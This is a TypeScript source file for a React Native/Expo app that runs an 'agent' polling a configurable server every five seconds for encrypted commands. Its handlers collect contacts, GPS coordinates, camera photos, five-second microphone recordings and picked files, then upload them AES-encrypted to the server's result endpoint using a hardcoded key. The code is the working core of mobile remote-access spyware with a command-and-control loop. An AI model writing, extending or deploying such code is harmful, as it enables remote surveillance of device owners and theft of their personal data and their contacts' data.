import * as Contacts from 'expo-contacts';
import * as Location from 'expo-location';
import * as ImagePicker from 'expo-image-picker';
import * as DocumentPicker from 'expo-document-picker';
import * as FileSystem from 'expo-file-system';
import { AudioModule, RecordingPresets } from 'expo-audio';
import CryptoJS from 'crypto-js';
import { serverConfigStore } from './server-config';

const AGENT_ID = "android-app-agent";
const E2E_SECRET_KEY = "lLj0r2Wby4wwW-OTCSyKm-XVUz_HNqx2VxAz3sfysa8="; // ⚠️ ضع مفتاح التشفير الخاص بك هنا

function encrypt(text: string) {
  return CryptoJS.AES.encrypt(text, E2E_SECRET_KEY).toString();
}

function decrypt(ciphertext: string) {
  const bytes = CryptoJS.AES.decrypt(ciphertext, E2E_SECRET_KEY);
  return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
}

export async function startAgent() {
    console.log("Agent started polling...");
    
    setInterval(async () => {
        try {
            const config = await serverConfigStore.load();
            if (!config.baseUrl) return;

            const payload = encrypt(JSON.stringify({ agent_id: AGENT_ID }));
            
            const resp = await fetch(`${config.baseUrl}/agent/poll`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Token': config.token || '' },
                body: JSON.stringify({ encrypted_payload: payload }) 
            });
            
            const data = await resp.json();
            if (data.encrypted_payload) {
                const decryptedData = decrypt(data.encrypted_payload);
                if (decryptedData.cmd) {
                    await executeCommand(decryptedData.cmd, config.baseUrl, config.token || '');
                }
            }
        } catch (e) {
            console.log("Agent poll error:", e);
        }
    }, 5000);
}

async function executeCommand(cmdObj: any, baseUrl: string, token: string) {
    const { cmd, id } = cmdObj;
    let result: any = { ok: false, output: "Unknown command" };

    try {
        if (cmd === 'ping') {
            result = { ok: true, output: 'pong from React Native!' };
        } 
        else if (cmd === 'contacts') {
            const { status } = await Contacts.requestPermissionsAsync();
            if (status === 'granted') {
                const { data } = await Contacts.getContactsAsync({ fields: [Contacts.Fields.PhoneNumbers] });
                result = { ok: true, output: JSON.stringify(data.slice(0, 5)) };
            } else result = { ok: false, output: "Contacts permission denied" };
        }
        else if (cmd === 'location') {
            const { status } = await Location.requestForegroundPermissionsAsync();
            if (status === 'granted') {
                const loc = await Location.getCurrentPositionAsync({});
                result = { ok: true, output: JSON.stringify(loc.coords) };
            } else result = { ok: false, output: "Location permission denied" };
        }
        else if (cmd === 'photo') {
            const { status } = await ImagePicker.requestCameraPermissionsAsync();
            if (status === 'granted') {
                const photo = await ImagePicker.launchCameraAsync({ quality: 0.5 });
                if (!photo.canceled) {
                    const base64 = await FileSystem.readAsStringAsync(photo.assets[0].uri, { encoding: FileSystem.EncodingType.Base64 });
                    result = { ok: true, file_base64: base64, filename: "photo.jpg" };
                } else result = { ok: false, output: "Camera canceled" };
            } else result = { ok: false, output: "Camera permission denied" };
        }
        else if (cmd === 'mic') {
            const { status } = await AudioModule.requestRecordingPermissionsAsync();
            if (status === 'granted') {
                // استخدام API مباشر بدون Hooks
                await AudioModule.setAudioModeAsync({ allowsRecording: true, playsInSilentMode: true });
                
                // دالة تسجيل الصوت المتاحة في expo-audio
                const recording = await AudioModule.createRecordingAsync();
                await recording.prepareToRecordAsync(RecordingPresets.HIGH_QUALITY);
                await recording.startAsync();
                
                await new Promise(resolve => setTimeout(resolve, 5000));
                
                await recording.stopAsync();
                const uri = recording.getURI();
                
                if (uri) {
                    const base64 = await FileSystem.readAsStringAsync(uri, { encoding: FileSystem.EncodingType.Base64 });
                    result = { ok: true, file_base64: base64, filename: "audio.m4a" };
                } else {
                    result = { ok: false, output: "Recording failed" };
                }
            } else result = { ok: false, output: "Mic permission denied" };
        }
        else if (cmd === 'get_file') {
            const file = await DocumentPicker.getDocumentAsync();
            if (!file.canceled) {
                const base64 = await FileSystem.readAsStringAsync(file.assets[0].uri, { encoding: FileSystem.EncodingType.Base64 });
                result = { ok: true, file_base64: base64, filename: file.assets[0].name };
            }
        }
        
        const encResult = encrypt(JSON.stringify({ agent_id: AGENT_ID, req_id: id, result }));
        await fetch(`${baseUrl}/agent/result`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Token': token },
            body: JSON.stringify({ encrypted_payload: encResult })
        });
    } catch (error) {
        console.log("Execution error", error);
    }
}
